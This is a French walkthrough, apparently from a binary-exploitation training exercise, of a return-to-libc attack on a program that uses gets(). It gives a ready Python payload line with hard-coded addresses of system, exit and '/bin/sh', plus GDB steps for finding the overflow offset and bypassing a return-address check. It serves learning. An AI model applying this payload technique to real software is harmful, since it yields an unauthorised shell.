# Exploit: Return-to-libc (ret2libc)

**Commande**:  
```bash
python -c 'print "a" * 80 + "\x3e\x85\x04\x08"  + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"' > /tmp/exploit3
```
**Explication**:  
Dans cette démonstration, nous exploitons une vulnérabilité en utilisant la technique de **ret2libc**. Cette méthode consiste à détourner le flux d’exécution normal d’un programme pour exécuter arbitrairement des fonctions de la bibliothèque **libc**. En particulier, nous utilisons les adresses des fonctions **system**, **exit**, et la chaîne **/bin/sh** pour ouvrir un shell système, ce qui nous permet d’exécuter des commandes avec les privilèges de l’utilisateur qui exécute le programme vulnérable.  
Cette exploitation est possible car `gets()` ne vérifie pas la taille du buffer, donc on peut provoquer un bufferoverflow.

**Étapes détaillées** :  
- Ouvrir le programme dans **GDB** avec la commande `gdb ./level2`.  
- Définir un point d’arrêt au début de la fonction **main** et démarrer l’exécution du programme avec les commandes `break main`, `run`, et `continue`.  
- Utiliser un générateur de pattern pour créer une séquence unique qui aidera à identifier l’offset exact où se produit le dépassement de tampon.  

  Pattern :  
  `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A`  
  (100 caractères)

- Exécuter le programme avec le pattern pour générer un **segfault** et examiner le registre **EIP** pour voir quelle partie du pattern a causé le dépassement, ce qui donne `0x37634136` (en hexadécimal). (`x/i $eip ==> 0x37634136 ==> 7cA6`)  
- Avec l’ordre des octets en **little endian** (6Ac7), cela correspond à l’offset **80** dans notre pattern.  
- Trouver l’adresse de la fonction **system**, **exit**, et la chaîne **/bin/sh** dans la **libc** en utilisant les commandes `p system`, `p exit`, et `find __libc_start_main,+99999999,"/bin/sh"`.  
- Étant donné que le programme vérifie si l’adresse de retour a été modifiée, utiliser l’adresse de la fonction `p()` pour contourner cette vérification. Assembler ensuite ces éléments dans la chaîne d’exploitation pour substituer l’adresse de retour par celle de la fonction **system** avec **/bin/sh** comme argument, et nettoyer avec **exit**.

**Ressources**:  
- [Return-to-libc (ret2libc)](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)  
- [Exercice Protostar Stack](https://infosecwriteups.com/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6)  
- [Ret2libc](http://wikisecu.fr/doku.php?id=appsysteme:ret2libc)
